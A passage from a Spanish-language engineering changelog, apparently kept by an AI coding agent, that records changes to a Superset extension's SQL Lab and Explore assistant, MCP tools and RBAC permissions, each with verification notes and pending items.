- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/routeObserver.test.ts` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/themeBridge.test.ts` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreHost.test.tsx` (nuevo)
- `custom-src/login/mcp_widget.py` (regla de ocultar "El Don" extendida a
  `/explore`; respaldo previo en `extensions/backups/`)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (rebuild)
- `PLAN_COPILOTO_EXPLORE.md`

Que cambia o corrige:
- **Montaje en `/explore` (tarea 1):** sin punto de montaje oficial (no
  hay `explore.*` ni `<ViewListExtension>` genérico fuera de SQL Lab en
  ningún archivo de la app — verificado con un grep sobre TODA la fuente,
  no solo Explore), `exploreHost.tsx` monta una raíz de React propia
  (`ReactDOM.render`/`unmountComponentAtNode`) sobre un `div` agregado a
  `document.body` al entrar a `/explore` (`routeObserver.ts`, que factoriza
  a TypeScript el mismo mecanismo `pushState`/`replaceState`/`popstate`
  que ya usaba, duplicado e inline, `mcp_widget.py`) y la desmonta al
  salir. 14 tests (9 + 5): sin fugas de nodos ni listeners en ida y
  vuelta repetida, sin remontar al navegar entre gráficos dentro de
  Explore.
- **Hallazgo no anticipado por el plan — el tema no se hereda fuera del
  árbol de React:** `theme.useTheme()` es el `useTheme()` de Emotion (lee
  `React.Context`); una raíz separada de la de SQL Lab no lo hereda, sin
  importar que `@apache-superset/core` se resuelva en runtime contra el
  mismo `window.superset` (Module Federation no crea relación de árbol de
  React entre bundles). Resuelto con `themeBridge.ts`: `document
  .getElementById('app').dataset.bootstrap` trae `common.theme
  .{default,dark}` — **confirmado idéntico en `/explore/`, `/sqllab/` y
  `/superset/welcome/`** contra la app de test real, no es específico de
  SQL Lab — y `themeNs.Theme.fromConfig(cfg)` (la misma clase pública)
  calcula los mismos tokens que vería el panel de SQL Lab, con el `antd`
  compartido como singleton. Modo claro/oscuro vía
  `localStorage['superset-theme-mode']` + `prefers-color-scheme`;
  recalcula con el evento propio del proyecto
  `superset-agent:theme-change` (ya usado para "El Don") como disparador,
  sin depender de su payload reducido. 11 tests.
- **Ocultar "El Don" en Explore (tarea 6):** `mcp_widget.py`, misma regla
  que SQL Lab (entrada 50), regex extendida a
  `/^\/(sqllab|explore)(\/|$)/`. Verificado extrayendo el snippet
  inyectado REAL desde una respuesta HTTP de `/explore/` contra la app de
  test y corriéndolo con Node contra 8 casos de navegación (incluida una
  ruta trampa `/exploreX/` que no debe ocultarse): 8/8.
- **`form_data` real (tareas 3-4) — hallazgo de `tab_id`:** contra
  `POST`/`GET`/`PUT /api/v1/explore/form_data` reales (con RBAC de
  verdad: `GetFormDataCommand` rechaza con 403 a un usuario sin acceso al
  dataset, verificado). **`PUT` sin `tab_id` genera SIEMPRE una key
  nueva** (`UpdateFormDataCommand` cachea `(sesión, tab_id, datasource,
  chart) → key`; sin `tab_id`, o con `0`, cae siempre a `random_key()`).
  Con el `tab_id` real de la pestaña (el mismo
  `sessionStorage['tab_id']` que ya usa el propio Explore vía su hook
  `useTabId()`), `PUT` sí reutiliza la misma key. Consecuencia para el
  adaptador de Explore (Fase 1): debe leer y mandar ese `tab_id`, o
  generaría una key huérfana en cada escritura, desincronizada del
  autoguardado del propio Explore.
- **Catálogo de controles (tarea 5) — por qué no hay atajo:** confirmado
  que `shared` de Module Federation del host solo cubre
  `react`/`react-dom`/`antd`, nunca `@superset-ui/core` (donde vive el
  registro de `buildQuery`); no hay ningún global de depuración
  alternativo. `chart.query_context` guardado es fiel solo hasta el
  último "Guardar" (confirmado en `saveModalActions.ts`: al guardar, el
  frontend arma el mismo payload que usa `/api/v1/chart/data` y lo manda
  como `query_context`). Los tres plugins propios (`html-cards`,
  `pivot-tableRx1`, `tableV3`) definen su propio `buildQuery.ts` (51/122/
  392 líneas) — ninguno usa el builder genérico. `master` (sin publicar)
  ya resolvió este mismo problema con 1139 líneas de Python
  (`chart_helpers.py`) que cubren SOLO tipos nativos, nunca plugins de
  terceros — y su propia lógica de resolución confirma el mismo criterio
  ya elegido acá: sin `form_data_key` confía en el `query_context`
  guardado sin chequeo de frescura aparte; con `form_data_key`, nunca lo
  reusa. Recomendación para Fase 1/4: usar el `query_context` guardado
  para gráficos sin ediciones pendientes (fidelidad total, sirve para los
  3 plugins propios sin trabajo extra); para ediciones pendientes en
  plugins propios, no hay atajo — es trabajo real de la Fase 6.
- Corrección de cifra: el conteo de tests de backend citado en turnos
  anteriores de esta conversación ("264") no se había vuelto a verificar;
  el número real en el repo (`git status` limpio) es 223. No hay ninguna
  regresión — no se tocó ningún archivo de backend en esta entrada.

Verificación: `npx tsc --noEmit` estricto, 129 tests de frontend (25
nuevos), 223 de backend (sin cambios), `build-extension.sh` completo sobre
`extensions_test/`. Sin verificación visual en navegador (pendiente antes
de cerrar la Fase 0, que sigue abierta: faltan los criterios de salida 1 y
2, y la auditoría de layout a 1366/1920px de la tarea 2).

### 2026-09-24 (55) (plan del copiloto de Explore: correcciones de una revisión externa)

Cambio realizado:
El usuario trajo una revisión del plan con cuatro puntos y ajustes de
alcance. Se verificaron todos en el código antes de incorporarlos.

Archivos afectados:
- `PLAN_COPILOTO_EXPLORE.md` (respaldo de la versión anterior en el
  scratchpad de la sesión)
- `Registro de cambios.md`

Que cambia o corrige:
1. **Estado visible:** `form_data_key` solo se actualiza al ejecutar
   ("Update chart"), al volver a renderizar, al cambiar de pestaña o al
   guardar, con debounce de 1 s (`ExploreViewContainer/index.tsx`). Un
   control editado sin ejecutar no está en la key → **criterio de salida 1
   de la Fase 0**: detectarlo o trabajar sobre el último estado ejecutado
   con contrato de UX explícito, y nunca perder cambios pendientes al
   aplicar.
2. **`query_context`:** `/api/v1/chart/data` recibe un `query_context` que
   arma el `buildQuery` de cada plugin en el navegador
   (`buildV1ChartDataPayload`); el registro no se comparte con la extensión
   (el host solo comparte `react`/`react-dom` por Module Federation).
   `samples` anula métricas y filtro temporal → **criterio de salida 2 de la
   Fase 0** (`query_context` fiel en nativos y plugins propios, o vista
   previa deshabilitada para ese tipo) y vista previa con `results`.
3. **RLS en diagnósticos:** `explain_query`/`check_query_nulls` aceptan SQL
   libre y solo verifican `can_access_database` (correcto en SQL Lab, no en
   Explore). El SQL que Superset genera para un dataset sí incluye el RLS
   (`apply_rls`) → diagnóstico **ligado al gráfico**, que genera el SQL en el
   servidor y verifica acceso al dataset, como **puerta** antes de la Fase 5.
4. **Carrera en la escritura del dataset:** comparar `changed_on` antes de
   escribir no es atómico → bloqueo de fila (`SELECT … FOR UPDATE`) más
   comprobación dentro de la misma transacción, y **prueba de dos escrituras
   concurrentes en PostgreSQL** (la metadata de test es SQLite), como
   **puerta** antes de la Fase 7.
- Alcance: rol **Admin fijo** (se quitó el rol configurable); "Deshacer" del
  dataset como única forma de borrado permitida, acotada a lo recién
  agregado y solo si ningún gráfico guardado lo usa; ocultar "El Don" edita
  `custom-src/login/mcp_widget.py`, como excepción explícita a "editar solo
  la extensión".
- Nueva sección "Revisiones del plan" al final del documento.

No hay cambios de código en esta entrada.

### 2026-09-18 (18) (UX del asistente SQL Lab)

Cambio realizado:
Se rediseñó el panel del asistente SQL Lab para aprovechar mejor el sidebar y
ofrecer acciones contextuales en lugar de un selector genérico.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/Conversation.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/SqlLabAssistantPanel.tsx`
- `Registro de cambios.md`

Que cambia o corrige:
- El historial, diagnósticos y propuestas ahora usan un área central desplazable;
  el compositor queda siempre visible al final del panel.
- El selector nativo se reemplaza por acciones rápidas: corregir el último error
  cuando existe, revisar/optimizar consulta, revisar selección y crear SQL.
- Se mejora la jerarquía visual, tamaños, tarjetas de conversación, estados de
  propuesta y etiquetas de confirmación para acciones que modifican o ejecutan SQL.
- Se agrega el atajo Ctrl/Cmd+Enter para enviar una solicitud.
- El panel se ancla al viewport: solo se desplazan mensajes y propuestas; el
  compositor nunca queda fuera de pantalla al crecer la conversación.

### 2026-09-18 (16) (corrección de get_sql_schema_context)

Cambio realizado:
Se investigó la llamada MCP de SQL Lab y se corrigieron dos problemas que impedían
usar la tool desde el flujo real: el request público enviaba `schema`, pero el modelo
solo aceptaba `schema_name`; además, producción no tenía la tool en la lista de tools
fijadas para descubribilidad. Los logs confirmaron que el error interno de producción
era `Unknown tool` al reenviar desde `call_tool`, no un fallo de ClickHouse.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/sql_schema_context.py`
- `custom-extensions/irex-mcp-tools/backend/tests/test_sql_schema_context.py`
- `/home/imercados/.superset/superset_config.py`

Que cambia o corrige:
- `schema` es ahora el nombre público y se mantiene `schema_name` como alias compatible.
- `get_sql_schema_context` queda fijada en `MCP_TOOL_SEARCH_CONFIG.always_visible` de
  producción, además del registro existente en test.
- Se agrega una prueba del alias público.

Verificacion:
- 12 tests focalizados y 124 tests del build completos sin errores.
- `.supx` de test reconstruido desde cero y smoke test de carga correcto; la tool queda
  registrada en el catálogo de la extensión.
- La llamada real existente con `schema_name` devuelve las columnas de ClickHouse,
  incluida `anio_id`; la forma pública con `schema` queda cubierta por test y lista
  para validarse al recargar el servicio.
- Pendiente operativo: reiniciar `superset_test.service` y `superset_mcp_test.service`
  introduciendo la contraseña local de `sudo`; después repetir la llamada MCP y reiniciar
  producción solo con autorización explícita.

### 2026-09-18 (17) (diagnóstico de sesión SQL Lab sqllab-2498ad2692c7db97838d566170131e3c26a94cbf0d33d0b5c8a4a2d378ca439a)

Resultado de investigación:
- El backend del chat envió correctamente `database_id=3`, `schema=default` y
  `table=ch_corte_ventas_vm` después de detectar `UNKNOWN_IDENTIFIER` para `anio`.
- El MCP de producción respondió `Unknown tool` (`err_1789750959`), porque su proceso
  sigue arrancado desde el 2026-09-09 y su `.supx` instalado es del 2026-06-29; ese ZIP
  no contiene `sql_schema_context.py`.
- El servicio de test, reiniciado a las 11:00:56, sí registra y descubre la tool, y la
  llamada con `schema` devuelve las columnas reales, incluida `anio_id`.

Conclusión:
La corrección de código está validada en test. La sesión falló porque todavía consume
el artefacto/proceso antiguo de producción. Promover el `.supx` nuevo a `extensions/` y
reiniciar `superset.service`/`superset_mcp.service` requiere autorización explícita.

### 2026-09-18 (15) (rediseño: tema claro/oscuro + estilo tipo chat)

Cambio realizado:
El usuario comparó el panel con "El Don con IA" (widget de chat de dashboards existente,
de otro repo/servidor) y pidió un formato similar, legible en tema claro y oscuro. Todos
los colores del panel estaban hardcodeados a valores claros — se migró a los design
tokens de tema de Superset, y se rediseñaron los bloques de código y el historial con
estilo tipo chat.

Archivos afectados:
- `frontend/src/assistant/SqlDiff.tsx` (bloque de código con header + botón copiar, fondo
  oscuro fijo tipo terminal)
- `frontend/src/assistant/Conversation.tsx` (avatares, colores vía `theme.useTheme()`)
- `frontend/src/assistant/Diagnostics.tsx` (colores vía tema)
- `frontend/src/assistant/SqlLabAssistantPanel.tsx` (botones y contenedores vía tema)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (regenerado)
- `PLAN_ASISTENTE_SQL_LAB.md` (resultado en la Fase 5)

Que cambia o corrige:
- Se adoptó `theme.useTheme()` de `@apache-superset/core` (tokens de Ant Design v5 que ya
  usa el resto de Superset) en vez de colores hex fijos — el panel ahora sigue el tema
  activo (claro/oscuro) automáticamente, sin lógica propia de `prefers-color-scheme`.
- Nota de compatibilidad: `@apache-superset/core/theme` como subpath no resuelve bajo
  `moduleResolution: node10` (misma limitación ya documentada para `/components` y
  `/sqlLab` en la Fase 0) — el tipo del tema se obtiene con
  `ReturnType<typeof themeNs.useTheme>` en vez de importar `SupersetTheme` directamente.
- El bloque de código SQL (`SqlDiff`) usa un fondo oscuro fijo independiente del tema del
  panel — mismo criterio que la mayoría de UIs de chat con código, prioriza contraste de
  sintaxis sobre seguir el tema circundante.
- Avatares circulares agregados al historial de conversación, inspirados en la estética
  del widget de chat existente (no se tuvo acceso a su código — vive en otro repo/servidor
  mantenido por el otro agente — se replicó solo lo visible en la captura compartida).

Verificacion:
- `npx tsc --noEmit` sin errores tras migrar los 3 componentes de presentación.
- `build-extension.sh` completo, `.supx` desplegado en `extensions_test/`.
- Pendiente: confirmación visual del usuario en tema claro y oscuro — no hay forma de
  probar el render real sin el navegador.

### 2026-09-18 (14) (mejora de UX general del panel de SQL Lab)

Cambio realizado:
Pasada de mejora de UX sobre el panel, a pedido genérico del usuario ("mejora de UX en
general", sin un punto puntual) tras ver la interfaz en la primera prueba real. Solo
presentación — sin cambios de lógica ni dependencias nuevas.

Archivos afectados:
- `frontend/src/assistant/Conversation.tsx`
- `frontend/src/assistant/Diagnostics.tsx`
- `frontend/src/assistant/SqlLabAssistantPanel.tsx`
- `extensions_test/irex-mcp-tools-0.1.0.supx` (regenerado)
- `PLAN_ASISTENTE_SQL_LAB.md` (resultado en la Fase 5)

Que cambia o corrige:
- Mensajes del historial ahora llevan label "Tú"/"Asistente" además de color/alineación.
- Diagnósticos colapsados por defecto (resumen con conteo por severidad + expandir) en vez
  de mostrar todas las alertas siempre abiertas.
- Tarjetas de propuesta con borde de color e ícono para distinguirse del resto; botones
  con jerarquía visual (Aplicar en azul, Ejecutar en ámbar de advertencia, Descartar
  neutro).
- Encabezado del panel con subtítulo explicativo; secciones separadas con línea divisoria
  y label ("Propuesta").

Verificacion:
- `npx tsc --noEmit` y `build-extension.sh` completo sin errores.
- Pendiente: confirmación del usuario de que esto atiende lo que le resultaba confuso.

### 2026-09-18 (13) (Fase 7 del asistente SQL Lab — tool irex.get_sql_schema_context)

Cambio realizado:
Se implementó la tool de esquema real (Fase 7), activada por un caso concreto: el usuario
renombró una columna real (`anio_id`) a un nombre inexistente (`anio`) y el asistente no
pudo resolverlo por falta de contexto de esquema. Probada end-to-end contra datos reales
de ClickHouse en el entorno de test.

Archivos afectados:
- `backend/src/irex/irex_mcp_tools/sql_schema_context.py` (nuevo)
- `backend/tests/test_sql_schema_context.py` (nuevo — 11 tests: permiso, acceso por base y
  tabla, serialización, truncamiento)
- `backend/src/irex/irex_mcp_tools/entrypoint.py` (import agregado)
- `superset_config_test.py` (`MCP_TOOL_SEARCH_CONFIG.always_visible` — solo test, no
  producción todavía)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (regenerado)
- `PLAN_ASISTENTE_SQL_LAB.md` (resultado en la Fase 7, nota para el agente del chat)

Que cambia o corrige:
- Reutiliza `superset.databases.utils.get_table_metadata` (la misma función que alimenta
  el árbol de tablas/columnas nativo de SQL Lab) y `security_manager.can_access_table`
  (mismo chequeo que el endpoint REST equivalente) — no reinventa el acceso a metadata.
- Dos modos: sin `table` lista nombres de tabla (tope 50, filtro `search` opcional); con
  `table` devuelve columnas (nombre, tipo, comentario, tope 300).
- Mismo gate RBAC que las 7 tools de datos de la Fase 2 (`SQLLab`/`can_execute_sql_query`)
  — ya cubierto para los 8 usuarios del chat, sin necesitar otra alta de permisos.
- Desviación consciente de un requisito del plan: no se aisló el import interno de
  Superset en `backend/.../compat/` — ninguna otra tool irex usa ese patrón, todas
  importan directo dentro de la función; introducirlo solo acá habría sido inconsistente.
- El campo de request `schema` se renombró a `schema_name` antes de terminar (Pydantic
  advertía que sombreaba un atributo heredado de `BaseModel`) — sin impacto porque la tool
  todavía no se había desplegado ni comunicado con ese nombre.

Verificacion:
- 123 tests totales (112 + 11 nuevos) pasan sin warnings.
- `build-extension.sh` completo, `.supx` desplegado en `extensions_test/`.
- Prueba real contra el MCP de test (`database_id=3`, ClickHouse) con `fastmcp.Client`:
  listado de tablas (truncado a 10), búsqueda por `search="corte"` (3 resultados), columnas
  reales de `ch_corte_ventas_vm` — la columna `anio_id` aparece exactamente donde el
  usuario esperaba encontrar el nombre correcto. Usuario sin permiso (`test`, rol Gamma)
  recibe el mismo `Permission denied` que las demás tools.
- Pendiente: que el agente del chat empiece a llamar esta tool activamente; agregar el
  tool al `always_visible` de producción cuando se autorice el despliegue completo.

### 2026-09-18 (12) (bug fix: "Explicar/corregir el último error" quedaba deshabilitado)

Cambio realizado:
El usuario probó el panel en el navegador real: funciona (envía, recibe diff y
diagnósticos), pero reportó que el modo "Explicar/corregir el último error" salía
deshabilitado pese a tener un error de ejecución real visible en pantalla. Investigado y
corregido.

Archivos afectados:
- `frontend/src/assistant/SqlLabAssistantPanel.tsx`
- `extensions_test/irex-mcp-tools-0.1.0.supx` (regenerado)
- `PLAN_ASISTENTE_SQL_LAB.md` (hallazgo documentado en la Fase 6)

Que cambia o corrige:
- Causa raíz confirmada leyendo `superset-frontend/src/core/sqlLab/index.ts`:
  `onDidQueryFail`/`onDidQuerySuccess` son eventos tab-scoped cuyo filtro de pestaña
  (`predicate`) captura el `sqlEditorImmutableId` de la pestaña activa en el momento en
  que se registra el listener, no dinámicamente. El panel se suscribía una sola vez al
  montar, así que si el usuario cambiaba de pestaña después, dejaba de enterarse de
  éxitos/fallos — `lastError` nunca se llenaba.
- Se separó el `useEffect` único en dos: uno para `onDidChangeActiveTab` (evento global,
  suscripción única) que incrementa un contador `activeTabVersion`, y otro para
  `onQuerySuccess`/`onQueryFail` con ese contador como dependencia — se re-suscribe cada
  vez que cambia la pestaña activa.
- Se confirmó además que el shape del objeto de error (`errorMessage`, `executedSql`) que
  ya usaba el panel es correcto — no era un problema de parsing, solo de cuándo se
  escuchaba el evento.

Verificacion:
- `npx tsc --noEmit` sin errores.
- `build-extension.sh` completo contra `extensions_test/`.
- Pendiente: confirmación del usuario en navegador de que el modo ya se habilita
  correctamente tras cambiar de pestaña y fallar una consulta ahí.

### 2026-09-18 (11) (Fase 6 del asistente SQL Lab — backend del chat probado contra el real)

Cambio realizado:
El agente que mantiene el backend del chat implementó `POST /api/sql-lab-assistant`.
Se probó directamente contra el servidor real (`http://186.177.26.27:8008`, compartido
por test y producción) con `curl`, simulando los headers del proxy, en 3 modos distintos.
Se encontró y corrigió una discrepancia menor y aditiva del contrato.

Archivos afectados:
- `frontend/src/contracts/assistant.ts` (`title?` opcional agregado a
  `AssistantActionReplaceSelection`/`ReplaceDocument`/`InsertSql`)
- `frontend/src/adapters/chatBackendAdapter.ts` (parser actualizado para leer ese `title`)
- `frontend/src/assistant/SqlLabAssistantPanel.tsx` (`titleFor` usa el título si viene)
- `docs/sql-lab-assistant-contract.md` (documentada la extensión)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (regenerado)
- `PLAN_ASISTENTE_SQL_LAB.md` (resultado de la prueba real documentado en la Fase 6)

Que cambia o corrige:
- El backend real responde con el shape exacto del contrato v1 en los 3 modos probados
  (`create`, `review_document`, `explain_error`): `contract_version`, `message`,
  `actions`, `diagnostics` correctos.
- Las acciones `replace_document` que devolvió el backend real traían `target`/`title`
  extra que el contrato no tipaba para ese `type` — no rompía nada (el parser ignora
  campos no tipados), pero se perdía el título descriptivo generado por el modelo. Se
  agregó `title?` opcional de forma aditiva (compatible hacia atrás, no requirió cambios
  del otro agente).

Verificacion:
- 3 llamadas `curl` reales contra `http://186.177.26.27:8008/api/sql-lab-assistant` con
  los headers `X-Service-Secret`/`X-Superset-User` que agrega el proxy: las 3
  respondieron 200 con JSON válido y coherente semánticamente (pidió contexto cuando no
  había SQL, corrigió un bug real de fecha sin comillas en los otros dos modos).
- `npx tsc --noEmit` y `build-extension.sh` completo (112 tests + build + empaquetado)
  tras el ajuste del contrato.
- **No verificado por esta sesión:** el manejo interno de `Permission denied:` del lado
  del backend del chat — reportado por el otro agente, no hay forma de simular esa
  condición desde afuera sin más contexto de su implementación.
- Pendiente: prueba visual del panel completo en el navegador contra `extensions_test/`.

### 2026-09-18 (10) (Fases 5 y 6 del asistente SQL Lab — panel completo + adaptador del chat)

Cambio realizado:
Se construyó la interfaz completa del asistente (Fase 5, reemplazando el panel
monolítico del spike) y el adaptador hacia el backend del chat (Fase 6, primera
iteración). Se detectó y corrigió un vacío del contrato v1 antes de que el otro agente
lo implemente: no tenía campo para el pedido del usuario ni el flujo elegido.

Archivos afectados:
- `frontend/src/contracts/assistant.ts` (agregado `AssistantMode`, `AssistantLastError`,
  y los campos `mode`/`userMessage`/`lastError` en `AssistantContext`)
- `frontend/src/adapters/chatBackendAdapter.ts` (nuevo — `fetch` same-origin, serialización
  snake_case, parseo validado de la respuesta, `AssistantBackendError`)
- `frontend/src/adapters/sqlLabAdapter.ts` (`readActiveContext` ahora recibe
  `mode`/`userMessage`/`lastError`)
- `frontend/src/assistant/Conversation.tsx` (nuevo)
- `frontend/src/assistant/SqlDiff.tsx` (nuevo — diff LCS propio, sin dependencia nueva)
- `frontend/src/assistant/Diagnostics.tsx` (nuevo)
- `frontend/src/assistant/SqlLabAssistantPanel.tsx` (reescrito completo)
- `docs/sql-lab-assistant-contract.md` (endpoint `POST /api/sql-lab-assistant` vía el
  proxy existente, campos nuevos del contrato)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (regenerado)
- `PLAN_ASISTENTE_SQL_LAB.md` (resultados en Fases 5 y 6, nuevo requerimiento para el
  agente del chat)

Que cambia o corrige:
- El contrato v1 original (Fase 3) solo llevaba `tab`/`editor` — no había forma de
  decirle al backend qué flujo eligió el usuario (Crear SQL / Revisar consulta / Revisar
  selección / Explicar error) ni qué pidió en texto libre. Se agregó antes de que el
  backend del chat implementara nada, así que no rompe compatibilidad con código
  existente.
- El panel ahora trata **toda** acción con `sql` (no solo `propose_sql`) como una
  propuesta que requiere confirmación explícita con su propio diff — ninguna acción se
  autoaplica al recibir la respuesta del backend.
- Se identificó el endpoint concreto que falta del lado del chat:
  `POST /api/sql-lab-assistant`, reenviado por el proxy same-origin que ya existe
  (`custom-src/login/mcp_widget.py`) — sin autenticación nueva que implementar ahí.

Verificacion:
- `npx tsc --noEmit` sin errores tras el refactor completo (7 módulos nuevos).
- `npm run build` (webpack) compiló los 7 módulos correctamente.
- `build-extension.sh` completo contra `extensions_test/`: 112 tests backend OK, build OK,
  `.supx` validado.
- **No probado en navegador todavía.** El flujo de "Enviar" no puede probarse end-to-end
  hasta que el backend del chat implemente `POST /api/sql-lab-assistant` — sin esa ruta,
  el proxy fallará al reenviar, que es el comportamiento esperado (no un bug del panel).
  Pendiente: validar visualmente la estructura del panel (selector de modo, textarea,
  historial) aunque el envío real todavía no pueda completarse.

### 2026-09-18 (9) (Fase 3 del asistente SQL Lab — documento de contrato)

Cambio realizado:
Se cerró la Fase 3 del plan: se verificó que `contracts/assistant.ts` (creado en el spike
de la Fase 0) coincide campo por campo con el JSON de ejemplo del plan, y se creó el
documento de entrega `docs/sql-lab-assistant-contract.md` para el agente del chat.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/docs/sql-lab-assistant-contract.md` (nuevo)
- `PLAN_ASISTENTE_SQL_LAB.md` (resultado documentado en la Fase 3)
- `Registro de cambios.md`

Que cambia o corrige:
- Deja explícito que el wire format hacia el backend del chat es `snake_case` (igual que
  el resto de las tools MCP), mientras que `contracts/assistant.ts` usa `camelCase`
  internamente — la conversión es responsabilidad del adaptador de la Fase 6, no del
  backend del chat.
- Documenta las 6 acciones (`propose_sql`, `replace_selection`, `replace_document`,
  `insert_sql`, `create_tab`, `suggest_execution`) con su schema y la regla de no parsear
  SQL desde texto libre del modelo.
- Referencia cruzada al contrato de error `permission_denied` (Fase 2) para que el agente
  del chat tenga todo en un solo documento.

Verificacion:
- Comparación campo por campo entre `contracts/assistant.ts` y el JSON de ejemplo del
  plan: coinciden 1:1 salvo el casing (camelCase vs snake_case), sin discrepancias de
  estructura.

### 2026-09-18 (8) (nota para el agente del chat: contrato de error permission_denied)

Cambio realizado:
Se agregó al plan una sección consolidada "Requerimientos para el agente del chat", con
el contrato de error `permission_denied` (texto libre, patrón exacto, ejemplo real, y las
3 reglas que el chat debe seguir) listo para comunicarle al agente que mantiene el backend
externo. Solo documentación — sin cambios de código.

Archivos afectados:
- `PLAN_ASISTENTE_SQL_LAB.md` (nueva sección, antes de "Decisiones de arquitectura")
- `Registro de cambios.md`

### 2026-09-18 (7) (Fase 2 del asistente SQL Lab — decoradores RBAC, probados en test)

Cambio realizado:
Se agregó `class_permission_name="SQLLab", method_permission_name="execute_sql_query"`
a las 7 tools irex que tocan datos reales con RLS, y se probó el gate end-to-end contra
`superset_mcp_test.service` con JWTs reales de dos usuarios representativos (uno con
permiso, uno sin). No se tocó producción con este cambio de código todavía — solo test.

Archivos afectados:
- `backend/src/irex/irex_mcp_tools/query_dataset.py`
- `backend/src/irex/irex_mcp_tools/sql_analysis.py` (tool `query_dataset_sql`)
- `backend/src/irex/irex_mcp_tools/compare_periods.py`
- `backend/src/irex/irex_mcp_tools/rank_partitions.py`
- `backend/src/irex/irex_mcp_tools/forecast.py`
- `backend/src/irex/irex_mcp_tools/export_excel.py` (tool `export_to_excel`)
- `backend/src/irex/irex_mcp_tools/column_values.py` (tool `list_column_values`)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (regenerado con `build-extension.sh` e
  instalado en test)
- `PLAN_ASISTENTE_SQL_LAB.md` (resultado documentado en la Fase 2)

Que cambia o corrige:
- Las 7 tools que consultan/derivan/exportan datos reales (`query_dataset`,
  `query_dataset_sql`, `compare_periods`, `rank_partitions`, `forecast`,
  `export_to_excel`, `list_column_values`) ahora exigen `can_execute_sql_query` en
  `SQLLab` antes de ejecutar — antes ninguna tool irex declaraba RBAC alguno.
  `chart_option` y las 5 tools informativas quedaron sin gate deliberadamente
  (`chart_option` no ejecuta queries propias; las informativas no exponen datos).
- Se verificó leyendo `superset/mcp_service/auth.py` y
  `superset/core/mcp/core_mcp_injection.py` que `method_permission_name="execute_sql_query"`
  se usa literal (arma `can_execute_sql_query`), confirmando que el gate corresponde
  exactamente al permiso dado de alta al rol `acceso chat` en el cambio anterior.

Verificacion:
- `build-extension.sh` completo: 112 tests OK, `py_compile` de 18 archivos OK, build
  frontend OK, `.supx` validado y desplegado en `extensions_test/`.
- Prueba end-to-end real contra el MCP de test (no simulada): JWT `sub=admin` (rol
  Admin, con permiso) ejecutó `irex.query_dataset` normalmente y devolvió datos reales;
  JWT `sub=test` (rol Gamma, sin permiso) fue rechazado con
  `Permission denied: can_execute_sql_query on SQLLab for user test (tool: query_dataset)`.
- Confirmado que `MCP_RBAC_ENABLED` no está deshabilitado en ningún config (usa el
  default `True`) en producción ni en test.
- Pendiente: coordinar con el agente del chat el contrato de error
  `Permission denied: <permiso> on <vista> for user <usuario> (tool: <tool>)` — es texto
  libre, sin código estructurado, así que el chat debe matchear el string
  `"Permission denied:"` y no reintentar. Pendiente también: desplegar este cambio de
  código a producción (`extensions/irex-mcp-tools-0.1.0.supx`) — no se hizo todavía,
  solo está en `extensions_test/`.

### 2026-09-18 (6) (Fase 2 del asistente SQL Lab — alta de permiso SQLLab en producción)

Cambio realizado:
Con autorización explícita del usuario, se dio de alta `can_read` y `can_execute_sql_query`
sobre `SQLLab` al rol `acceso chat` (`role_id=100`) en la base de datos de producción
(Postgres), para resolver el hallazgo crítico de la auditoría: 5 de los 8 usuarios del chat
no tenían acceso real a SQLLab y perderían las funciones centrales del chat si se aplicara
el gate RBAC planeado en los decoradores MCP.

Archivos/sistemas afectados:
- Base de datos de producción (Postgres, `ab_permission_view_role`): 2 filas nuevas
  (`permission_view_id=294` → `can_execute_sql_query`, `permission_view_id=364` →
  `can_read`, ambas con `role_id=100` = rol `acceso chat`). No se tocó código ni
  configuración.
- `PLAN_ASISTENTE_SQL_LAB.md` (decisión y ejecución documentadas en la Fase 2)
- `Registro de cambios.md`

Que cambia o corrige:
- Se descartó agregar el permiso a `Permiso basico` (175 usuarios totales, la gran mayoría
  sin relación con el chat) por blast radius desproporcionado — se confirmó el conteo antes
  de decidir.
- Se usó `acceso chat` (`CHAT_WIDGET_REQUIRED_ROLE`) en su lugar: ya está scopeado
  exactamente a los 8 usuarios del chat por definición, sin necesidad de crear un rol nuevo.
- Los 3 caminos planteados en el hallazgo crítico de la auditoría quedan resueltos: los 8
  usuarios del chat ya cumplen el gate de `SQLLab` que exigirán los decoradores MCP
  pendientes (Fase 2, sección "Decoradores MCP", todavía no aplicados al código).

Verificacion:
- Antes del alta: `SELECT` confirmó que `acceso chat` no tenía ningún permiso sobre
  `SQLLab` (0 filas).
- El primer intento de `INSERT` (sin `id` explícito) falló con
  `null value in column "id" violates not-null constraint` — la tabla
  `ab_permission_view_role` no tiene secuencia automática en esta base. Se resolvió
  calculando `MAX(id)+1` dentro de la misma transacción, sin dejar escritura parcial (el
  primer intento no comprometió nada, confirmado por el 0 filas post-fallo).
- Post-alta: los 8 usuarios de `acceso chat` (incluido el inactivo `pabloTest2`) tienen
  `can_read`+`can_execute_sql_query` en `SQLLab` vía ese rol. El conteo de usuarios con
  `role_id=100` se mantuvo en 8 — ningún otro usuario del sistema quedó afectado.
- Todas las consultas y el alta se corrieron contra producción porque los usuarios reales
  del chat solo existen ahí (el entorno de test tiene usuarios ficticios propios); es un
  cambio de datos (rol/permiso), no de código, así que no pasa por el flujo de deploy de
  `.supx`.
- Pendiente: aplicar los decoradores `class_permission_name`/`method_permission_name` a
  las 7 tools de datos, probarlos primero en test con usuarios representativos (punto 6 de
  la auditoría) y coordinar el contrato de `permission_denied` con el agente del chat
  (punto 7) antes de tocar código de producción.

### 2026-09-18 (5) (Fase 2 del asistente SQL Lab — auditoría RBAC, sin cambios de permisos)

Cambio realizado:
Se ejecutó la auditoría previa obligatoria de la Fase 2 (puntos 1-4, de solo lectura):
confirmación del auth bridge JWT→usuario, usuarios con rol "acceso chat" en producción
y sus permisos reales en `SQLLab`, y matriz de las 14 tools irex por si tocan datos
reales con RLS. No se modificó ningún decorador, permiso, ni rol.

Archivos afectados:
